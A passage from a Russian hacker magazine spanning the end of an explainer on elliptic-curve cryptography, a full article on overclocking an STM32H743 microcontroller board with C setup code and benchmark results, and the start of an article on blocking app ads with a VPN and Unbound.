сированном диапазоне. Более того, нас в этом диапа зоне инте ресуют целые
числа — а кривая состоит не только из них. При решении уравнения эллипти‐
ческой кривой (y² = x³ + ax + b) мы используем тот же самый трюк с «док‐
ручиванием» чисел, превышающих максимум. Если за максимум взять прос‐
тое число, такая эллиптическая кривая называется простой — и обладает
превосходными криптогра фическими свой ства ми.
   Вот пример кривой (y² = x³ − x + 1), построенной для всех значений.





А вот та же кривая, но построенная только для целых значений с мак‐
симумом 97.





Совсем не похоже на кривую в традиционном понима нии — но это она. Выг‐
лядит так, как будто ставшую вдруг невидимой кри вую прикололи кнопками
в точ ках, где она выдает целые зна чения. И заметь, горизонтальная сим‐
метрия сохранилась.
  На самом деле мы все еще можем играть на этой кривой в бильярд
и соединять точ ки. И любая прямая по‐прежнему может соб рать на себе
не более трех точек. Вычислить эти точки довольно легко. Представь себе,
что линия, соединяющая две точки, — это нитка, которая обматывается вок‐
руг кривой, пока не попадет на третью. Это как если бы в нашем странном
бильярде шар, ударившись о бортик (максимум), волшебным образом
перемещался на противоположную сторону стола и продол жал свое дви‐
жение до тех пор, пока не ударится о точку, — как в игре «Асте роиды».





С помощью такого пред ставления кривой уже реально зашифровывать сооб‐
щения. Можно предста вить исходное число сообщения как x, получить
из уравнения y — и, соот ветственно, точку на кривой. На практике все чуть
сложнее, но общая идея такова.
  Для слова FLARE получим точки с коор динатами (70,6), (76,48), ‐, (82,6),
(69,22).
   (На этой кривой нет точки при x = 65, но в реальном мире есть способы
обойти эту проблему.)
  Эллиптическую криптосистему определяют: взятое за максимум прос тое
число, уравнение кривой и открытая (стартовая) точка на кривой. Секретным
клю чом будет число priv, а открытым ключом — стартовая точка, соединен‐
ная сама с собой priv раз. Вычисление секретно го ключа по открытому
в  такой  криптосистеме  называется  функцией  дискретного  логариф ма
эллиптической кривой. Кажется, это и есть та TDF, которую мы искали.


ЧТО ВСЕ ЭТО ЗНАЧИТ?
Вычислить дискретный логарифм эллиптической кривой трудно — на чем
и строится эллиптическая крип тогра фия. Спус тя несколько десятилетий
математики так и не нашли алго ритм, который решал бы эту проблему лучше
простого перебора. Другими словами, в отличие от факторизации с ее понят‐
ными математическими осно ваниями, у этой проблемы, кажется, нет корот‐
кого решения, которое сократило бы раз рыв в TDF. При работе с чис лами
одной величины решить дискретный логарифм эллиптичес кой кривой гораз‐
до труднее, чем разложить число на множители. А значит, эллиптичес кие
криптосистемы крепче RSA и протокола Диффи — Хеллмана.
   Чтобы иллюстрировать, нас колько крепче, Арь ен Ленстра нес колько лет
назад представил концепцию «Универ сальной безопасности»  (PDF). Суть
в том, чтобы вычислить, сколько энергии тра тится на взлом криптографичес‐
кого алгоритма, и сравнить с тем, сколько воды можно вски пятить той же
энергией. Эдакий криптогра фический углеродный след. По его расчетам,
на взлом 228‐битного RSA‐ключа требует ся мень ше энергии, чем на кипяче‐
ние одной чайной ложки воды. Для сравнения: энергией, потраченной
на взлом 228‐битного ECC‐ключа, можно вскипятить всю воду на планете.
Чтобы добиться того же уровня безопасности c RSA, нужен ключ в 2380 бит.
  С эллиптической криптографией можно использовать ключи меньшей дли‐
ны — и получать тот же уровень безопасности. А маленькие ключи важны,
особенно в мире, где все больше криптогра фии на маломощ ных девай сах
типа телефонов. Перемножить два простых числа проще, чем разложить
результат на множите ли — но, когда прос тые чис ла становятся слишком
длинными, даже умножение может занять на маломощ ных устройствах
какое‐то вре мя. В принципе, можно поддерживать безопасность RSA, уве‐
личивая длину ключей, — но производительность на клиенте от этого снизит‐
ся. ECC, кажется, предлагает альтернативу получше — высокую безопас‐
ность и короткие быстрые ключи.


ЭЛЛИПТИЧЕСКИЕ КРИВЫЕ В ДЕЙСТВИИ
Эллиптические кривые медленно запрягали, но теперь стремительно набира‐
ют популярность — и очень быстро рас пространяются. Эллиптическую крип‐
тографию сейчас можно найти в самых раз ных при ложениях: правительство
США использует ее для защиты внутренних коммуникаций, проект Tor — что‐
бы обеспечить анонимность; этот же механизм работает, если нужно под‐
твердить право собственности на биткойны, отпра вить сооб щение в iMes‐
sage и зашифровать данные DNS с помощью DNSCurve; также это пред‐
почтительный метод аутентификации для безопасного серфа через SSL/TLS.
Cloudﬂare пользуется ECC, чтобы обеспечить со вершенную пря мую сек‐
ретность (PFS), которая необ ходима, чтобы сохранить приватность в сети.
   Криптографические алгоритмы первого поколения вроде RSA и Диффи —
Хел лмана все еще подойдут для большинс тва сфер, но ECC быстро набирает
популярность — как решение для конфиденциаль ности и безопасности
в интернете.


             INFO

                      Дальше пойдут чуть устаревшие сведения и кар‐
                        тинки — из тех времен, когда деревья были выше,
                        трава зеленее, а браузеры щедрее делились све‐
                      дениями о шифровании. Зато эти сведения и кар‐
                        тинки наглядны — так что пролистывать их не сто‐
                            ит.


Если ты откроешь HTTPS‐версию блога Cloudﬂare через свежий Chrome
или Firefox, то твой браузер будет использовать эллиптическую криптогра‐
фию. Можешь убедиться в этом сам — нажми на замок слева от адресной
строки и выбери вкладку «Соединение».





На этой картинке нас в первую очередь интересует текст ECDHE_RSA. ECDHE
расшифровывается как Elliptic Curve Diﬃe Hellman Ephemeral — это механизм
обмена ключами, построенный на эллиптических кривых. В Cloudﬂare он
обеспечивает совершенную пря мую сек ретность на SSL. А с помощью RSA
здесь идентифицируется сервер.
  Мы исполь зуем RSA, потому что SSL‐сертификат Cloudﬂare привязан
к паре RSA‐ключей. Но современные браузеры поддерживают и сертификаты
на эллиптических кривых. Если бы Cloudﬂare исполь зовал такой сертификат,
его обозначение выглядело бы ECDHE_ECDSA. Идентификация сервера
в таком случае выполнялась бы с помощью эллиптического алгоритма элек‐
тронной подписи (Elliptic Curve Digital Signature Algorithm).
   Уравнение эллиптичес кой кривой для ECDHE, которую использует Cloud‐
ﬂare (и Google.com, кстати):


max: 115792089210356248762697446949407573530086143415290314195533
631308867097853951
curve: y² = x³ + ax + b
a = 115792089210356248762697446949407573530086143415290314195533
631308867097853948
b = 410583637251521421293261297800472684091144410159937255548352
56314039467401291

Уровень производительнос ти ECDSA по сравнению с RSA впечатляет. Даже
со старыми версиями OpenSSL, которые не заточены под код эллиптических
кривых, ECDSA‐подпись с 256‐бит ным ключом более чем в 20 раз быстрее
RSA‐подписи с 2048‐бит ным ключом.
  На MacBook Pro с OpenSSL 0.9.8 тест ско рости выдает:


Doing 256 bit sign ecdsa's for 10s: 42874 256 bit ECDSA signs in 9.
99s
Doing 2048 bit private rsa's for 10s: 1864 2048 bit private RSA's in
9.99s

То есть с ECDSA за то же время можно получить в 23 раза больше подписей,
чем с RSA.
   Cloudﬂare постоянно ищет спо собы поднять производительность SSL.
Например, мы начали использовать оптимизированную версию ECC, которая
увеличивает ско рость ECDHE более чем в два раза. Эллиптическая крип‐
тография экономит время, мощность и вычислительные ресурсы — как для
сервера, так и для браузера — и помогает нам сделать сеть одновременно
быстрее и безопаснее.


ОБОРОТНАЯ СТОРОНА
Но не все так радужно в мире эллиптических кривых — есть и тонкие места,
которые мешают им полностью охва тить отрасль.


             INFO

                    Примечание переводчика: далее речь снова пой‐
                        дет о делах минувших дней — но делах показа‐
                         тельных.


Одно из них — недавно мелькавший в новостях Dual_EC_DRBG (Dual Elliptic
Curve Deterministic Random Bit Generator). Это генератор случайных чисел,
стандартизированный Национальным институтом стандартов и технологий
США (NIST), который продвигало их же Агентство национальной безопас‐
ности.
  Dual_EC_DRBG генери рует псевдослучайные чис ла, используя принцип
эллиптических кривых. Его алго ритм берет точки на кривой и многократно
выпол няет операцию по соединению этих точек — чтобы получить новые.
После его публикации сообщалось (PDF), что в генератор, воз можно, встро‐
ен бэкдор — а значит, пос ледова тельность полученных чисел можно пол‐
ностью предсказать, если есть правильный секретный ключ.
  Недавно компания RSA отоз вала нес колько сво их продуктов, потому что
Dual_EC_DRBG был уста новлен как дефолтный генератор псевдослучайных
чисел в их линейке продуктов безопас ности. Был генератор случайных чисел
написан с бэкдором или нет, силу самой технологии эллиптичес ких кривых
это не отменяет — но зато поднимает воп рос о стандартизации. Как мы уже
писали ранее, нужно следить, чтобы ваша система использовала адекватно
случайные числа.
  Некоторые скептически настроенные криптогра фы вообще испы тывают
недоверие — и к самому NIST, и к опуб ликованным им стандартам, которые
поддержало АНБ. Почти все широко применя емые эллиптичес кие кривые
попадают в эту категорию. Об атаках на эти конкретные кривые ничего
не слышно — однако пло хие кривые существу ют, и некоторые считают, что
лучше поберечься, чем потом сожалеть.
   Есть, конечно, кое‐какой прогресс в разработке кривых с эффективной
арифметикой за предела ми NIST, вклю чая кривую 25519, созданную Дэни‐
елом Бернштейном (djb), и недавно вычисленные кривые Пауло Баретто
со товарищи, — но до их широкого распростра нения еще жить и жить. Пока
эти «нетрадиционные» кривые не встро ят в бра узе ры, их нельзя будет
использовать для обеспечения безопасности передаваемых по сети данных.
  Другое тонкое место ECC свя зано с патентами. Более 130 патентов, каса‐
ющихся конкретного использования эллиптичес ких кривых, при надлежат
BlackBerry — ведь в 2009 году они приобрели Certicom. Многие из тех патен‐
тов лицензированы для экс клюзивного использования частными компани‐
ями — и даже АНБ. Некоторые разработ чики из‐за этого взя ли паузу — чтобы
оценить, не нарушает ли их работа с ECC эти патенты. В 2007 году Certicom
подала иск против Sony — из‐за нескольких видов использования эллипти‐
ческих кривых, — однако в 2009 году иск был отклонен. Сейчас уже есть куча
разных реализаций криптогра фии с эллиптичес кими кри выми, которые,
как считается, не нарушают эти патенты — а потому широко используются.
   У цифровой подписи ECDSA есть серь езный недостаток по сравнению
с RSA: она требует хорошего источника энтропии. Без дос таточной слу чай‐
ности чисел секретный ключ могут рас крыть. В 2013 году слабый генератор
случайных чисел в Android позволил хакерам найти секретный ключ ECDSA
и взломать несколько биткойн‐кошельков. У Sony PlayStation была похожая
уязвимость. Для электронных подписей нужен хороший генератор случайных
чисел. Dual_EC_DRBG уж точно не подойдет.


ЗАГЛЯДЫВАЯ ВПЕРЕД
Впрочем, недостатки есть у всякой технологии, а вот достоинства ECC
по сравнению с традиционной RSA неос поримы — и уже широко признаны.
Многие эксперты беспокоятся, что матема тические алгоритмы RSA и Диф‐
фи — Хеллмана могут быть успешно взломаны в течение ближайших лет —
и тогда ECC останется единс твенной разумной альтернативой.
ТРЮКИ
 РАЗГОНЯЕМ
      МИКРОКОНТРОЛЛЕР





                                                                         Александр Бурага
                                                                                   Инженер‐конструктор
                                                                               радиоэлектронной техники. С
                                                                             вниманием следит за
                                                                               прогрессом IoT и носимой
                                                                                           электроники.
                                                                                        dtp‐avb@yandex.ru





         КАК Я ВЫЖАЛ 620 МГЦ
  ИЗ СОВМЕСТИМОЙ С ARDUINO ПЛАТЫ





Производительности всегда не хватает. Не важно, идет ли
речь о ноут буке, суперкомпьютере, смартфоне или мик‐
роконтроллере. Иногда проб лему можно решить, просто
обновившись до топово го железа. Но если и его вдруг ока‐
залось недос таточно, то дальше оста ется толь ко разгон.
Такая соблазнитель ная возможность, что ей едва ли стоит
сопротив ляться.


Решившись на разгон, ты тут же столкнешься с двумя основными проб‐
лемами. Во‐первых, нужно как‐то вывес ти железо за штатный режим работы
и при этом сохранить ста бильность. Во‐вто рых, полученный прирост про‐
изводительности предстоит еще чем‐то замерить, чтобы оце нить реальную
пользу от всех ухищрений.
  Конечно, если речь идет о раз гоне игро вого ПК, то зачас тую все тривиаль‐
но. Многие производители процессоров и видеокарт выпускают собственные
утилиты для повыше ния напряжения и тактовых час тот, так что в итоге все
сводится к перемещению ползунков в окошке программы. После чего оста‐
ется только запустить встро енный в игру бенчмарк и наблюдать рост циферок
(FPS имеет значение, ага).
  Но задумывался ли ты, как это все работа ет на самом деле? И что нужно
знать, чтобы достичь по‐настоящему выдающихся результатов? Попробую
продемонстрировать на примере.


АППАРАТНАЯ ЧАСТЬ
Низкоуровневый разгон железа проще всего будет показать на обычном мик‐
роконтроллере. Наверняка ты зна ком с Arduino — эта крохотная плата
перевернула мир мейкеров, хакеров и всех сопричастных. В ней минимум
компонентов: кварцевый резона тор, микросхема ATmega328P и регулятор
питания. И все же это почти компь ютер. А значит, ее тоже можно разогнать!
  Однако сегодня я настроен на максимальный результат, и какие‐то жал‐
кие 16 МГц тактовой частоты меня совершенно не интересуют. Отложим Ar‐
duino в сторонку и возьмем плату Nucleo‐144 на основе STM32H743.
   Если пытаться подобрать подходящую аналогию из мира персональных
компьютеров, то перед нами Core i9, вне вся ких сомнений. Ядро ARM (Cortex‐
M7) тут работает на ошеломительной частоте 480 МГц — это ровно в 15 раз
быстрее оригинальной  Arduino Uno. Мало  того, здесь раз мещено два
мегабайта постоянной флеш‐памяти и целый мегабайт ОЗУ. Производитель‐
ности добавляет кеш программ и кеш данных (по 16 Кбайт), а также встро‐
енный ускоритель исполнения кода ART.
  Сегодня существуют две версии такой отладочной платы. Изначально
в модельной линейке Nucleo‐144 появи лась H743ZI с программатором ST‐
Link V2‐1 и микроконтроллером ревизии  Y. Она поддержи вала штатную
работу «всего лишь» на 400 МГц. Но уже через нес колько месяцев произво‐
дитель сумел оптимизировать схему кристалла и начал выпускать микрокон‐
троллеры Н7 новой ревизии V с базовой частотой в 480 МГц. Именно они лег‐
ли в основу платы H743ZI2. Кро ме того, обновили и программатор — теперь
это ST‐Link V3E с возможностью внутрисхемной эмуляции.





Так что, если будешь выбирать себе такую же пла ту, будь пре дельно внимате‐
лен, внешне они очень похожи и выполнены на одинаково белом текстолите.
Да и по дру гим параметрам особых отличий нет: разъ емы Arduino, Morpho,
Ethernet и интерфейс USB присутс твуют на обе их пла тах.


НОВАЯ IDE
Даже очень хорошее железо может оказаться бес полезным, если для него
не будет подходяще го ПО. К счастью, это понимают и в компании ST Micro‐
electronics, поэтому сравнительно недавно там сделали собственную CubeI‐
DE. Однако совсем новой ее назвать трудно. По сути, это надстройка
над Eclipse, что может обрадовать поль зователей, знакомых со средами Atol‐
lic TrueStudio и AC6 Workbench.
  Интегрированная среда разработ ки не толь ко бес платна и доступна
на всех основных платформах (поддерживаются Windows, Linux и macOS),
но еще и позволяет «из коробки» пользоваться современными средствами
отладки и трассировки (OpenOCD, GDB), а также настраивать периферию
микроконтроллера буквально в пару кликов мыши.


           WARNING

                    При попытке отладки приложе ния на H743ZI2 сре‐
                      да будет настойчиво требовать обно вить ST‐Link
                      до «актуальной версии». Делать этого ни в коем
                        случае не стоит, по крайней мере если не хочешь
                         откатить   прошивку   самого   прог рамматора
                      до доисторической версии. Действительно акту‐
                        альное обновление ты сможешь накатить только
                      при помощи ST‐Link Utility.


После установки и нас тройки тулчейна можно переходить к тес тированию.
Нам предстоит портировать исходные коды бенчмарков на нашу архи тектуру
и реализовать пару платформенно зависимых функций. Так как опе рационная
система в данном случае совершенно не обя зательна, нужно будет пере‐
определить функцию printf для вывода отладочной информации и функцию
текущего времени — для расчета результата тестов.


        WWW

                      Если  тебе  больше по душе  Arduino  IDE, ты
                    можешь сделать проект в ней. Начиная с вер‐
                      сии 1.6.0 в пакет stm32duino была добавлена
                      поддержка платы H743ZI2. Зайди на GitHub раз‐
                       работчиков и далее следуй инструк циям в опи‐
                        сании, что бы добавить ссылку для менеджера
                         пакетов.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

        РАЗГОНЯЕМ
  МИКРОКОНТРОЛЛЕР
                             КАК Я ВЫЖАЛ 620 МГЦ
              ИЗ СОВМЕСТИМОЙ С ARDUINO ПЛАТЫ





НАСТРАИВАЕМ ПРОЕКТ
После создания проекта для отладочной платы Nucleo‐H743ZI2 нам нужно
изменить несколько настроек по умолчанию.





Окно настройки периферии имеет две полезные области (на самом деле их
гораздо больше, но нас сейчас интересуют конкретно эти): Pinout & Conﬁgu‐
ration и Clock Conﬁguration. Функции перифе рии можно указать из меню,
выпадающего по правому щелчку мыши. Более тонкая настройка производит‐
ся в окне System view. Гра фическое представление тактового дерева можно
найти во вкладке Clock Conﬁguration.





Обрати внимание, что для дальнейшей настройки сис темной частоты в качес‐
тве основного источника будет использовать ся ФАПЧ (PLL), тактиру емый
от внешнего кварцевого резона тора HSE. В нашем случае он уже находится
на отладочной плате и имеет номинал 8 МГц.
  Максимально возможная  тактовая  час тота ядра и сис темной шины
при этом может быть обеспечена установкой делителей DIVM1 = 1 и
DIVP1 = 7. Значение мно жителя DIVN1 предстоит увеличи вать до тех пор,
пока микроконтрол лер будет работать ста биль но. Делители HPRE, D1PRE,
D2PPRE1, DRPPRE2 и D3PPRE установим равными двум, остальные оставим
по умолчанию.
   Нельзя забывать и о питании. Блок ФАПЧ работа ет от линейного регуля‐
тора, режим которого [VOS0...VOS5] программно задает уровень нап‐
ряжения от 1,35 до 0,7 В. Кроме того, при необ ходимости можно подать
внешнее питание Vcore, но только если оно не превышает 1,4 В.
   Как ты понимаешь, повышение напряжения позволя ет добиваться боль‐
ших тактовых частот. Это связано с тем, что транзисторы в схеме начинают
быстрее менять свое сос тояние  (сокращается длительность переднего
и заднего фронта сигнала).


             INFO

                     Подробнее ознакомиться  с системой  питания
                     микроконтроллеров семейства STM32H7 можно
                        в разделе System supply conﬁguration аппноута
                       Smart power management.


Для расчета вре мени добавим таймер TIM2. С уста новленной конфигурацией
делителей он будет работать на частоте, равной половине системной SYSCLK.
На этом настройку параметров можно завершить, так что сохраняй установки
и запускай генерацию про екта.





Теперь предсто ит указать компилятор и компоновщик. Это можно произвести
в меню Project → Properties → C/C++ Build → MCU Settings (MCU GCC Com‐
piler, MCU GCC Linker). Причем для чисто ака демических целей предлагаю
сперва оставить оптимизации на уровне ‐O0 (оптимизация отключена).
  На следующем шаге нам нужно обеспечить корректную работу функции
printf. Для этого подклю чаем заголо вочный файл <stdio.h> и добавляем
клю чик компиляции ‐u _printf_float для компоновщика. Остается только
реализовать функцию вывода символов:


int __io_putchar(int ch) {
  /* Use Instrumentation Trace Macrocell */
  ITM_SendChar((uint32_t) ch);
  return ch;
}





Кроме того, переопределим функцию установки тактовой частоты:


SystemClock_Config(uint32_t* FinalCoreClock) {
  ...
  __HAL_PWR_VOLTAGESCALING_CONFIG(PWR_REGULATOR_VOLTAGE_SCALE0);
  ...
  RCC_OscInitStruct.PLL.PLLM = 1;
  RCC_OscInitStruct.PLL.PLLN = 120; /* @480 MHz */
  RCC_OscInitStruct.PLL.PLLP = 2;
  RCC_OscInitStruct.PLL.PLLQ = 4;
  RCC_OscInitStruct.PLL.PLLR = 2;
  RCC_OscInitStruct.PLL.PLLRGE = RCC_PLL1VCIRANGE_3;
  RCC_OscInitStruct.PLL.PLLVCOSEL = RCC_PLL1VCOWIDE;
  RCC_OscInitStruct.PLL.PLLFRACN = 0;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK) {
    Error_Handler();
  }
  ...
  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_14) !=
HAL_OK) {
    Error_Handler();
  }
  ...
  *FinalCoreClock = HSE_CLOCK / 2 * RCC_OscInitStruct.PLL.PLLN;
}

В листинге выше особый интерес представляет настройка множителя PLLN,
который влияет на тактовую час тоту ядра (что самым непосредс твенным
образом сказывается на производитель ности). Также обрати внимание
на процедуру выбора источника питания для ФАПЧ __HAL_PWR_VOLTAGESCAL‐
ING_CONFIG и установку таймингов для флеш‐памяти HAL_RCC_ClockConfig.
  Функцию настрой ки таймера TIM2 можно реализовать следующим обра‐
зом:


static void MX_TIM2_Init(uint32_t CoreClock) {
  ...
  htim2.Instance = TIM2;
  htim2.Init.Prescaler = (CoreClock / (2 * 1000000)) ‐ 1;
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
  htim2.Init.Period = 0xFFFFFFFF; /* timer period */
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_ENABLE;
  ...
}

Теперь в любой точ ке нашего кода мы сможем узнать количество мик‐
росекунд, прошедших с запуска таймера. Для это го достаточно будет прос то
обратиться к регистру TIM2 → CNT.


             INFO

                    Вообще говоря, наличие на микросхе ме активной
                       системы охлаждения из вентилятора и кулера
                      не обя зательно. Убедиться в этом помога ет каль‐
                        кулятор питания, в соответствии с которым энер‐
                        гопотребление не должно превысить 200 мА
                       на  штатной  частоте. Далее  простые  расчеты
                      показывают, что даже при квадратичной зависи‐
                     мости нам нужно будет разгонять ФАПЧ вплоть
                      до  одно го   гигагерца,   чтобы  приблизиться
                          к «опасной» отметке в 85 °С.



БЕНЧМАРКИ
Сам по себе разгон вряд ли кому‐то интересен, куда важнее его результаты:
сколько процентов про изводительнос ти реаль но удалось получить и поз‐
волило ли это утереть нос соседу. А для этого хорошо бы сперва договорить‐
ся об общих критериях оценки системы.
   Удивительно, но это не так‐то прос то. Задачи у всех раз ные, а уж способов
их решения и того больше. К счастью, с годами вроде бы всем удалось
договориться, однако это была целая история.


Крат кая исто рия про исхожде ния попуга ев
Первым широко распростра ненным тестом производительнос ти принято
считать Whetstone, который вышел в нояб ре 1972 года. В качестве эталонной
единицы измерения в нем использовался 1 MWIPS, соответствующий одному
миллиону операций в секунду на архитек туре DEC VAX‐11/780. Тест включал
в себя 150 простых выражений, раз делен ных на восемь блоков, которые
исполнялись в основном цикле.
  Предполагалось, что малый раз мер теста поз волит пол ностью умес тить
его в кеш L1 вычислитель ных машин и игно рировать преиму щества L2. Whet‐
stone не был рассчитан на использование оптимизационных компиляторов,
что в итоге привело к путанице в расчете резуль татов. Появившиеся в 1980‐х
«продвинутые» компилято ры научились оптимизи ровать адресные переходы,
виртуально увеличивая производитель ность в тестах в два раза.
   Если тест Whetstone не был привязан к какой‐либо операционной сис теме
(и исполнялся в том числе на barebone‐платформах), то разработанный
в 1984 году тест Dhrystone предназна чал ся для оценки производительности
вычислительных систем на ядре Unix и исполь зовал, например, системные
библиотечные функции работы со временем.
  В отличие от Whetstone, делающего упор на работу с числами с пла‐
вающей точкой, Dhrystone специализировался на работе с целочисленны ми
и строковыми переменными. В нас тоящее время для оценки производитель‐
ности достаточно широко используется версия 2.1, которая научилась больно
бить компиляторы по рукам за любые попытки излишней оптимизации.
  Синтетический тест CoreMark пришел на смену Dhrystone в 2009 году. Он
вклю чает в себя вычисление контрольной суммы, работу со связанными
списками, сортировку и мат ричные операции. Таким образом, он максималь‐
но приближен  к исполня емому  коду современных проектов. CoreMark
не использует системные библиотеки (его код полностью доступен в виде
исходников) и тоже достаточно эффективно борется с опти мизирующей фун‐
кцией компиляторов.
  На сегодняшний день консорциум EEMBC (создатель CoreMark) — один
из наиболее авторитетных раз работчиков синтетических тестов для мик‐
роконтроллеров и устройств IoT. Предос тавляемые на рассмотрение резуль‐
таты проходят проверку и добавляют ся в рей тинг. Ознакомиться с ним ты
можешь на сайте EEMBC в разделе CoreMark Scores.





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
        РАЗГОНЯЕМ
  МИКРОКОНТРОЛЛЕР
                             КАК Я ВЫЖАЛ 620 МГЦ
              ИЗ СОВМЕСТИМОЙ С ARDUINO ПЛАТЫ





Портиру ем код
Актуальная версия бенчмарка Whetstone включает в себя один файл whet‐
stone.c, совместимый c ANSI C89, и щедро приправлена метками и опе рато‐
рами безусловного перехода goto. Да, вот такая занятная древность! Пор‐
тирование заключается в переименовании функции тес та c main на другое
имя (например, whetstone). Кроме того, нужно не забыть передать ей аргу‐
менты ls (количество повторений теста в рамках одного прогона) и to‐
tal_LOOPS (общее количество прогонов за весь тест).


        WWW

                    Исходные  коды  описан ных  бенчмарков  есть
                       на GitHub:
                       •Whetstone
                        •Dhrystone
                       •CoreMark


Реализация бен чмарка Dhrystone 2.1 состоит из трех файлов: dhry_1.c,
dhry_2.c и dhry.h. Так как тест был раз работан для операционных систем
семейства  Unix, помимо переименовывания функции main необходимо
реализовать функцию time (с использовани ем макроса #define TIME). Так‐
же нужно переопределить #define Mic_secs_Per_Second 1000000.0 (так
как используемый нами системный таймер работает на час тоте 1 МГц и один
отсчет этого таймера соответству ет одной микросекунде).
  Бенчмарк CoreMark реализован в нес кольких файлах, но настрой ка и пор‐
тирование теста происходит в заголо вочном файле с говорящим названием
core_portme.h. Для корректно го расчета времени необходимо установить
макроопределения ITERATIONS (раз работчики архитек туры ARM рекомен‐
дуют подобрать такое количес тво итераций, чтобы длительность исполнения
теста была не менее 30 с) и CLOCKS_PER_SEC (тактовая частота считающего
время таймера, в нашем случае 1 000 000).
  После добав ления тес тов в рабочий цикл функции вызова бенчмарков
основная программа для оценки производитель ности примет следующий
вид:


#include <stdio.h>
#define TOTALCYCLES 10


int main(void) {
  HAL_Init();
  SystemClock_Config(&coreClock);
  printf("System clock: %lu \n\r", coreClock);
  MX_GPIO_Init(); /* Initialize all configured peripherals */
  MX_TIM2_Init(coreClock);
  for (int c = 0; c < TOTALCYCLES; c++) {
    htim2.Instance‐>CNT = 0; /* Reset 32‐bit timer value */
    HAL_TIM_Base_Start(&htim2); /* Start timer */
    printf("======================================\n\r");
    printf("Cycle run: %d\n\r", c);


    printf("Whetstone test ... beginning \n\r");
    whetstone(1000, 10); /* Run Whetstone test */
    printf("Whetstone test ... end \n\r");


    printf("Dhrystone test ... beginning \n\r");
    dhrystone21(10000000); /* Run Dhrystone test */
    printf("Dhrystone test ... end \n\r");


    printf("Coremark test ... beginning \n\r");
    core_main(); /* Run Coremark test */
    printf("Coremark test ... end \n\r");


    HAL_TIM_Base_Stop(&htim2); /* Stop timer */
  }
  HAL_GPIO_WritePin(GPIOB, GPIO_PIN_0, GPIO_PIN_SET);


  while (1);
}


ПОЕХАЛИ!
Перед запуском мик роконтроллера в настройках отладчика ST‐Link необ‐
ходимо вклю чить поддержку Serial Wire Viewer (SWV) и указать текущую так‐
товую частоту ядра микроконтроллера. Кроме того, нужно включить окно
вывода SWV «Window → Show View → SWV → SWV ITM Data Console» и раз‐
решить вывод нажатием на кнопку Start Trace.





К сожалению, во время экспериментов ты можешь слу чайно «залочить» мик‐
роконтроллер таким образом, что он перес танет отвечать на сигналы прог‐
рамматора. Поэтому в про ектах, работа ющих с неш татны ми частотами, край‐
не рекомендуется поставить временную задержку перед функцией, опре‐
деляющей  тактовую час тоту процессора  (хотя бы в несколько  секунд).
В таком случае ты успеешь подключиться отладчиком и перепрошить мик‐
роконтроллер.
   Есть альтернативный способ: выбери режим under reset в параметрах
отладчика и зажми кнопку сброса. Тогда на линии nRST окажется логический
ноль и микросхема перейдёт в режим программирования.


           WARNING

                      Будь внимателен! Во время экспериментов есть
                      вероятность «залочить» микроконтроллер.


Предположим, все прош ло удачно и программа выдала результат. Но выг‐
лядит он удивительно: 8 DMIPS и 69,75 CoreMark абсолютно не соответству ют
заявленным характерис тикам и уж тем более нашим амбициям. :)
   Что же мы упустили? Во‐первых, стоит включить кеш программ и данных,
добавив во вре мя инициализации функции SCB_EnableICache и SCB_En‐
ableDCache. Либо ты можешь активировать их в графическом меню через
настройки периферии (даже несмотря на то, что они напрямую относятся
к ядру): CORTEX M7 → CPU Icache → Enabled / CPU Dcache → Enabled.
Во‐вторых, можно поиграть с ключами оптимиза ции компилятора ‐O3 и
‐Ofast. Ну и наконец, мы же можем разогнать микроконтроллер и попытаться
полностью раскрыть потенциал железа!


АНАЛИЗ РЕЗУЛЬТАТОВ
Не буду долго ходить вокруг да около: после череды попыток и последова‐
тельного  увеличения  множителя  частоты  PLLN  до  155  (соответству‐
ет 620 МГц) мне удалось добиться стабильной работы H743 и без проблем
пройти все тесты. Резуль таты приведены на графике ниже.





Более медленное исполнение кода из ОЗУ в нашем слу чае объясняется кон‐
курентным доступом к памяти данных/программ и независимым доступом
в случае расположения исполня емого кода в области флеш‐памяти.
   Как видно из результатов, тест Whetstone наиболее подвержен влиянию
настроек компилятора и является наименее реп резентативным из представ‐
ленных. А при разгоне с максимальными нас трой ками оптимизации ком‐
пилятора GCC получен результат, который уверенно превзошел заявленные
производителем характеристики (2400 CoreMark / 1027 DMIPS).


ИТОГИ
Если при слове «мик роконтроллеры» тебе представляется ардуинка на AVR,
мигающая све тодиодом как заведенная, то спешу тебя обрадовать — ее сов‐
ременные аналоги способны на куда более интерес ные вещи. Некоторые
даже запускают на них нейронные сети и исполь зуют для машинного зрения.
Что неудивительно — с такими‐то характеристиками.
  Вообще говоря, полученные результаты поз воляют помес тить нынешние
микроконтроллеры на уровень персональных компьютеров второй половины
нулевых, что очень неплохо! Более детально ознакомиться с рейтингом оце‐
нок и историей происхождения большинства тес тов ты можешь на этом сай‐
те.
   Удачного разгона!
ТРЮКИ

 ПРОГРАММЫ
  БЕЗ РЕКЛАМЫ





     ИСПОЛЬЗУЕМ VPN И UNBOUND,
       ЧТОБЫ УБРАТЬ БАННЕРЫ
          ИЗ ПРИЛОЖЕНИЙ





Недавно я купил телефон Xiaomi и всем был
доволен, кроме рекламы в фирменных при‐
ложениях. Да, есть функция, которая ее
должна отключать, но полностью от нее
не избавиться. Поэто му я почти не исполь‐             GH0st3rs                                                                                        qiqwoe@protonmail.com
зую телефон для просмотра сайтов, ведь
в мобильных бра узерах вообще  нельзя
установить блокираторы рекламы.


Кто‐то скажет, что реклама помога ет поддерживать бесплатные проекты, и,
возможно, когда‐то это так и было, но сейчас реклама — сбор информации
о тебе, твоих привычках, поисковых запросах и прочем: достаточно пос‐
мотреть трафик, который генерирует твой телефон во время обычного
использования. Я давно укомплектовал свой десктопный браузер плагинами
типа NoScript и uBlock, почти позабыл о рекламе, но телефон о ней постоянно
напоминал.
  Последней каплей стало то, что я решил изучить трафик приложения Xiao‐
mi MiFit и обнаружил в ответах серверов ссылки на странные APK‐файлы
(описывать их я не стану, это выходит за рамки статьи. Желающие могут
самостоятельно перехватить зло получные запросы, тем более что они идут
по обычному HTTP).
  Долго думать не пришлось, под рукой был сво бодный сервер с белым IP.
Его я и решил использовать, чтобы развернуть VPN, а заодно и настроить там
